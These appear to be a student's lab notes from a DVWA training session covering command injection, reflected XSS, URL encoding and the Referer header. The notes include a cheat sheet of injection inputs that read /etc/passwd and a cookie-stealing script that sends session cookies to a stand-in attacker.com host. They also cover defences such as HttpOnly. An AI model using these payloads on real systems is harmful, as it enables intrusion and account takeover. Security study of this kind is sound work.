# Day 4 Notes — Command Injection & XSS on DVWA

---

## 1. What We Did Today Overview

- Ran OS commands on a server using Command Injection
- Injected JavaScript into a web page using Reflected XSS
- Learned how the browser processes requests and responses
- Understood URL encoding, Referer header, and cookie stealing
- Did everything both in the browser AND through Burp Suite

---

## 2. Command Injection

### What is it
The web app takes your input and passes it directly to the operating system terminal without filtering it. You can add your own OS commands after the intended input using special characters.

### The vulnerable code logic
```
ping [whatever user types]
```
If no filtering exists you can add commands after the ping using `;` which means "run this next command too."

### What we did
Went to DVWA → Command Injection → typed these one by one:

```bash
127.0.0.1                    # normal ping, expected behavior
127.0.0.1; ls                # ping + list files in current directory
127.0.0.1; whoami            # ping + show what user the server runs as
127.0.0.1; pwd               # ping + show current directory path
127.0.0.1; cat /etc/passwd   # ping + dump entire user list file
```

### What the `;` does
In Linux terminal `;` means "run the next command regardless of what the first one does." So `ping 127.0.0.1; whoami` runs ping AND whoami one after the other.

### How we did it through Burp
1. Turned Intercept ON
2. Submitted `127.0.0.1` in the form
3. Request froze in Burp — found `ip=127.0.0.1` in the request body
4. Sent to Repeater → changed `ip=127.0.0.1` to `ip=127.0.0.1;+whoami`
5. Clicked Send → saw command output in the response panel

### Why this is critical in real hacking
If you find command injection on a real server you can:
- Read any file on the server
- Create new admin users
- Download malware onto the server
- Get a full reverse shell (complete remote control)

### Real world severity
**Critical — CVSS 10.0.** Direct OS access. Game over for the target.

---

## 3. How HTTP Requests and Responses Work (What Burp Shows)

### The REQUEST (what Burp intercepts)
This is what your browser sends TO the server. It contains:
- The HTTP method (GET or POST)
- The URL with your payload in it
- Headers like Cookie, User-Agent, Referer
- The server hasn't done anything yet at this point

### The RESPONSE (what comes back)
This is what the server sends BACK to your browser after processing your request. It contains:
- Status code (200, 302, 404 etc)
- Response headers
- The actual HTML of the page with your input embedded in it

### The full flow
```
You type payload in browser
        ↓
Browser sends GET request to server
(THIS IS WHAT BURP SHOWS IN INTERCEPT)
        ↓
Server takes your input, puts it in HTML with no sanitization
        ↓
Server sends HTML response back to browser
(SEE THIS IN HTTP HISTORY → RESPONSE TAB)
        ↓
Browser reads HTML, sees <script> tag, executes it
        ↓
Alert pops / cookie stolen
```

### How to see the response in Burp
- Burp → HTTP History tab
- Click the request
- Right panel → click Response tab
- Ctrl+F → search for your payload
- You'll see your script tag sitting raw inside the HTML

---

## 4. URL Encoding

### What is it
Browsers can't send special characters like `< > ( ) "` raw in a URL because they have special meanings in HTTP. So the browser automatically converts them to a safe encoded format before sending.

### Common encodings

| Character | URL Encoded |
|---|---|
| `<` | `%3C` |
| `>` | `%3E` |
| `(` | `%28` |
| `)` | `%29` |
| `"` | `%22` |
| space | `+` or `%20` |
| `/` | `%2F` |

### What we saw
When we typed `<script>alert(1)</script>` in the browser form it became:
```
name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```
The server decodes it back to the original before processing — that's why the XSS still fires.

### When it's NOT encoded
When you paste directly into the URL bar or Burp Repeater the characters sometimes go raw:
```
name=<script>alert(document.cookie)</script>
```
Both encoded and raw versions work — the server handles both.

---

## 5. The Referer Header

### What it is
A header the browser automatically adds to every request that says "I came from this page." It contains the URL of the previous page you were on.

### Why we saw "hello Ainz" in it
1. We submitted `<script>alert("hello Ainz")</script>` first
2. That became the current page URL
3. We then submitted `<script>alert(1)</script>`
4. Browser automatically set Referer = the previous URL which contained the hello Ainz payload

### Why this matters in real hacking
Referer header can leak sensitive data. Example:
```
/reset-password?token=supersecrettoken123
```
If a user clicks an external link from this page their browser sends:
```
Referer: https://target.com/reset-password?token=supersecrettoken123
```
The external site receives the secret token. That's a real vulnerability called **Referer leakage** — found regularly in bug bounty programs.

---

## 6. Reflected XSS

### What is it
The app takes your input and immediately reflects it back in the HTML response without sanitizing it. If you input JavaScript the browser executes it. Called "reflected" because your input bounces straight back at you (and anyone you trick into clicking a crafted link).

### What we did
Went to DVWA → XSS (Reflected) → typed these payloads:

**Payload 1 — basic confirm it works:**
```html
<script>alert(1)</script>
```
Alert popped with "1" — XSS confirmed.

**Payload 2 — steal the session cookie:**
```html
<script>alert(document.cookie)</script>
```
Alert showed: `PHPSESSID=ijqukc1alc70a0d1lt6mi07tn4; security=low`
That's the real session token — the one that keeps you logged in.

**Payload 3 — no script tag needed:**
```html
<img src=x onerror=alert(1)>
```
Browser tries to load an image from `x` — fails — fires the `onerror` event which runs our JavaScript. Useful when `<script>` tags are filtered.

**Payload 4 — confirm execution context:**
```html
<script>alert(document.domain)</script>
```
Shows which domain the script runs on — confirms it's executing in the context of the target site.

### How we confirmed it in Burp
1. HTTP History → clicked the XSS request
2. Response tab → Ctrl+F → searched "alert"
3. Found our script tag sitting raw inside the HTML:
```html
<p>Hello <script>alert(document.cookie)</script></p>
```
No sanitization at all — input goes straight into the page.

### Why reflected XSS is dangerous in real life
The attacker crafts a malicious URL with the payload in it:
```
http://target.com/xss?name=<script>steal_cookie()</script>
```
Sends it to a victim via email or message. Victim clicks it → their browser executes the script → cookie sent to attacker → attacker logs in as victim.

---

## 7. Cookie Stealing via XSS — The Full Attack

### What the real attack looks like
Instead of an alert an attacker uses:
```javascript
<script>
new Image().src="http://attacker.com/steal?c="+document.cookie
</script>
```

### What this does step by step
1. Browser executes the script
2. Script creates an invisible image element
3. Sets its `src` to the attacker's server with the cookie appended
4. Browser makes a GET request to attacker's server carrying the victim's cookie
5. Attacker sees the cookie in their server logs
6. Attacker pastes cookie into their browser using Burp or browser dev tools
7. Server thinks attacker IS the victim — full account takeover

### The victim sees nothing
No alert, no popup, no warning. Completely silent.

### What stops this
- `HttpOnly` flag on the cookie — JavaScript cannot read the cookie at all
- In Burp look at the Set-Cookie response header:
```
Set-Cookie: PHPSESSID=abc123; HttpOnly; Secure; SameSite=Strict
```
If `HttpOnly` is missing → cookie is stealable via XSS → that's a vulnerability.

---

## 8. Reflected XSS vs Stored XSS

| | Reflected XSS | Stored XSS |
|---|---|---|
| Where payload goes | Directly back in response | Saved in database |
| Who gets hit | Only victim who clicks the link | Every user who visits the page |
| Persistence | Gone after one request | Permanent until DB is cleared |
| Severity | High | Critical |
| Example | Malicious link in email | Comment box on a forum |

---

## 9. Key Concepts Summary

| Term | Meaning |
|---|---|
| Command injection | App passes user input to OS terminal unsanitized |
| `;` in Linux | Run next command regardless of first |
| XSS | App puts user input into HTML without sanitizing |
| Reflected XSS | Input bounces back immediately in the response |
| Stored XSS | Input saved in DB fires for every visitor |
| URL encoding | Browser converts special chars to `%XX` format |
| Referer header | Browser tells server what page you came from |
| `document.cookie` | JavaScript reads all cookies for current domain |
| HttpOnly | Cookie flag that blocks JavaScript from reading it |
| PHPSESSID | PHP session cookie that keeps you logged in |

---

## 10. Payloads Cheat Sheet

### Command Injection
```bash
127.0.0.1; whoami
127.0.0.1; ls
127.0.0.1; cat /etc/passwd
127.0.0.1; id
```

### XSS
```html
<script>alert(1)</script>
<script>alert(document.cookie)</script>
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### Real cookie steal
```javascript
<script>new Image().src="http://attacker.com/?c="+document.cookie</script>
```

---

*Day 4 complete. Tomorrow is Friday — review day. Recall everything from this week from memory before moving to Week 2 which is full XSS deep dive on PortSwigger.*
